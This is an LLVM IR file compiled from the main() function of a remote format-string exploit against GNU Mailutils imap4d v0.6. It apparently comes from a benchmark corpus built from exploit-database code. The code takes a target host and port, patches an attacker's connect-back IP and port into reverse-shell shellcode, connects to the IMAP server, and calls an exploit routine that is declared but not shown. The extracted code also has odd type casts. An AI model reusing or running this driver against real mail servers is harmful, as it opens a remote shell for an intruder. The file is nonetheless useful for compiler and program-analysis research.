; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@IMAPD = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [58 x i8] c"\0A GNU Mailutils imap4d v0.6 remote format string exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c" by CoKi <coki@nosystem.com.ar>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"h:p:c:b:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@rhost = common dso_local global i32 0, align 4
@cback = common dso_local global i64 0, align 8
@rport = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [27 x i8] c" [*] verifying your host\09:\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [17 x i8] c" gethostbyname()\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@conn_back = common dso_local global i32* null, align 8
@shsize = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [5 x i8] c" %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c" [*] connect back port\09\09: %u\0A\00", align 1
@.str.8 = private unnamed_addr constant [53 x i8] c"\0A [!] failed! your host or port contain null-bytes\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [29 x i8] c" [*] verifying target host\09:\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c" [*] target imapd port\09\09: %u\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c" [*] connecting...\09\09:\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@ERROR = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [10 x i8] c" socket()\00", align 1
@TIMEOUT = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [10 x i8] c" closed\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c" done!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  store i8* null, i8** %8, align 8
  %13 = load i32, i32* @IMAPD, align 4
  store i32 %13, i32* %10, align 4
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  br label %16

16:                                               ; preds = %48, %2
  %17 = load i32, i32* %4, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = call signext i8 @getopt(i32 %17, i8** %18, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  store i8 %19, i8* %6, align 1
  %20 = sext i8 %19 to i32
  %21 = load i8, i8* @EOF, align 1
  %22 = sext i8 %21 to i32
  %23 = icmp ne i32 %20, %22
  br i1 %23, label %24, label %49

24:                                               ; preds = %16
  %25 = load i8, i8* %6, align 1
  %26 = sext i8 %25 to i32
  switch i32 %26, label %43 [
    i32 104, label %27
    i32 112, label %29
    i32 99, label %33
    i32 98, label %39
  ]

27:                                               ; preds = %24
  %28 = load i8*, i8** @optarg, align 8
  store i8* %28, i8** %7, align 8
  br label %48

29:                                               ; preds = %24
  %30 = load i8*, i8** @optarg, align 8
  %31 = call i8* @atoi(i8* %30)
  %32 = ptrtoint i8* %31 to i32
  store i32 %32, i32* %10, align 4
  br label %48

33:                                               ; preds = %24
  %34 = load i8*, i8** @optarg, align 8
  %35 = call i32 @inet_addr(i8* %34)
  store i32 %35, i32* @rhost, align 4
  %36 = load i8*, i8** @optarg, align 8
  store i8* %36, i8** %8, align 8
  %37 = load i64, i64* @cback, align 8
  %38 = add nsw i64 %37, 1
  store i64 %38, i64* @cback, align 8
  br label %48

39:                                               ; preds = %24
  %40 = load i8*, i8** @optarg, align 8
  %41 = call i8* @atoi(i8* %40)
  %42 = ptrtoint i8* %41 to i32
  store i32 %42, i32* @rport, align 4
  br label %48

43:                                               ; preds = %24
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @use(i8* %46)
  br label %48

48:                                               ; preds = %43, %39, %33, %29, %27
  br label %16

49:                                               ; preds = %16
  %50 = load i8*, i8** %7, align 8
  %51 = icmp eq i8* %50, null
  br i1 %51, label %52, label %57

52:                                               ; preds = %49
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @use(i8* %55)
  br label %57

57:                                               ; preds = %52, %49
  %58 = load i64, i64* @cback, align 8
  %59 = icmp ne i64 %58, 0
  br i1 %59, label %60, label %112

60:                                               ; preds = %57
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %62 = load i32, i32* @stdout, align 4
  %63 = call i32 @fflush(i32 %62)
  %64 = load i8*, i8** %8, align 8
  %65 = call %struct.hostent* @gethostbyname(i8* %64)
  store %struct.hostent* %65, %struct.hostent** %11, align 8
  %66 = icmp eq %struct.hostent* %65, null
  br i1 %66, label %67, label %71

67:                                               ; preds = %60
  %68 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %70 = call i32 @exit(i32 1) #4
  unreachable

71:                                               ; preds = %60
  %72 = load i32*, i32** @conn_back, align 8
  %73 = call i64 @strlen(i32* %72)
  store i64 %73, i64* @shsize, align 8
  %74 = load i32, i32* @rhost, align 4
  %75 = and i32 %74, 255
  %76 = load i32*, i32** @conn_back, align 8
  %77 = getelementptr inbounds i32, i32* %76, i64 33
  store i32 %75, i32* %77, align 4
  %78 = load i32, i32* @rhost, align 4
  %79 = and i32 %78, 65280
  %80 = ashr i32 %79, 8
  %81 = load i32*, i32** @conn_back, align 8
  %82 = getelementptr inbounds i32, i32* %81, i64 34
  store i32 %80, i32* %82, align 4
  %83 = load i32, i32* @rhost, align 4
  %84 = and i32 %83, 16711680
  %85 = ashr i32 %84, 16
  %86 = load i32*, i32** @conn_back, align 8
  %87 = getelementptr inbounds i32, i32* %86, i64 35
  store i32 %85, i32* %87, align 4
  %88 = load i32, i32* @rhost, align 4
  %89 = and i32 %88, -16777216
  %90 = lshr i32 %89, 24
  %91 = load i32*, i32** @conn_back, align 8
  %92 = getelementptr inbounds i32, i32* %91, i64 36
  store i32 %90, i32* %92, align 4
  %93 = load i32, i32* @rport, align 4
  %94 = and i32 %93, 65280
  %95 = ashr i32 %94, 8
  %96 = load i32*, i32** @conn_back, align 8
  %97 = getelementptr inbounds i32, i32* %96, i64 39
  store i32 %95, i32* %97, align 4
  %98 = load i32, i32* @rport, align 4
  %99 = and i32 %98, 255
  %100 = load i32*, i32** @conn_back, align 8
  %101 = getelementptr inbounds i32, i32* %100, i64 40
  store i32 %99, i32* %101, align 4
  %102 = load %struct.hostent*, %struct.hostent** %11, align 8
  %103 = getelementptr inbounds %struct.hostent, %struct.hostent* %102, i32 0, i32 0
  %104 = load i64, i64* %103, align 8
  %105 = inttoptr i64 %104 to %struct.in_addr*
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 4
  %108 = call i8* @inet_ntoa(i32 %107)
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %108)
  %110 = load i32, i32* @rport, align 4
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i32 %110)
  br label %112

112:                                              ; preds = %71, %57
  %113 = load i32*, i32** @conn_back, align 8
  %114 = call i64 @strlen(i32* %113)
  %115 = load i64, i64* @shsize, align 8
  %116 = icmp slt i64 %114, %115
  br i1 %116, label %117, label %120

117:                                              ; preds = %112
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.8, i64 0, i64 0))
  %119 = call i32 @exit(i32 1) #4
  unreachable

120:                                              ; preds = %112
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0))
  %122 = load i8*, i8** %7, align 8
  %123 = call %struct.hostent* @gethostbyname(i8* %122)
  store %struct.hostent* %123, %struct.hostent** %11, align 8
  %124 = icmp eq %struct.hostent* %123, null
  br i1 %124, label %125, label %129

125:                                              ; preds = %120
  %126 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %128 = call i32 @exit(i32 1) #4
  unreachable

129:                                              ; preds = %120
  %130 = load %struct.hostent*, %struct.hostent** %11, align 8
  %131 = getelementptr inbounds %struct.hostent, %struct.hostent* %130, i32 0, i32 0
  %132 = load i64, i64* %131, align 8
  %133 = inttoptr i64 %132 to %struct.in_addr*
  %134 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 4
  %136 = call i8* @inet_ntoa(i32 %135)
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %136)
  %138 = load i32, i32* %10, align 4
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0), i32 %138)
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %141 = load i32, i32* @stdout, align 4
  %142 = call i32 @fflush(i32 %141)
  %143 = load i32, i32* @AF_INET, align 4
  %144 = load i32, i32* @SOCK_STREAM, align 4
  %145 = call i32 @socket(i32 %143, i32 %144, i32 0)
  store i32 %145, i32* %9, align 4
  %146 = load i32, i32* @ERROR, align 4
  %147 = icmp eq i32 %145, %146
  br i1 %147, label %148, label %152

148:                                              ; preds = %129
  %149 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %150 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %151 = call i32 @exit(i32 1) #4
  unreachable

152:                                              ; preds = %129
  %153 = load i32, i32* @AF_INET, align 4
  %154 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 3
  store i32 %153, i32* %154, align 4
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @htons(i32 %155)
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %156, i32* %157, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %159 = load %struct.hostent*, %struct.hostent** %11, align 8
  %160 = getelementptr inbounds %struct.hostent, %struct.hostent* %159, i32 0, i32 0
  %161 = load i64, i64* %160, align 8
  %162 = inttoptr i64 %161 to %struct.in_addr*
  %163 = bitcast %struct.in_addr* %158 to i8*
  %164 = bitcast %struct.in_addr* %162 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %163, i8* align 4 %164, i64 4, i1 false)
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %166 = call i32 @bzero(i32* %165, i32 8)
  %167 = load i32, i32* %9, align 4
  %168 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %169 = load i32, i32* @TIMEOUT, align 4
  %170 = call i32 @connect_timeout(i32 %167, %struct.sockaddr* %168, i32 4, i32 %169)
  %171 = load i32, i32* @ERROR, align 4
  %172 = icmp eq i32 %170, %171
  br i1 %172, label %173, label %176

173:                                              ; preds = %152
  %174 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %175 = call i32 @exit(i32 1) #4
  unreachable

176:                                              ; preds = %152
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0))
  %178 = load i8*, i8** %7, align 8
  %179 = load i32, i32* %10, align 4
  %180 = call i32 @getinfo(i8* %178, i32 %179)
  %181 = load i8*, i8** %7, align 8
  %182 = load i32, i32* %10, align 4
  %183 = call i32 @exploit(i8* %181, i32 %182)
  %184 = load i32, i32* %3, align 4
  ret i32 %184
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @use(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strlen(i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #1

declare dso_local i32 @getinfo(i8*, i32) #1

declare dso_local i32 @exploit(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
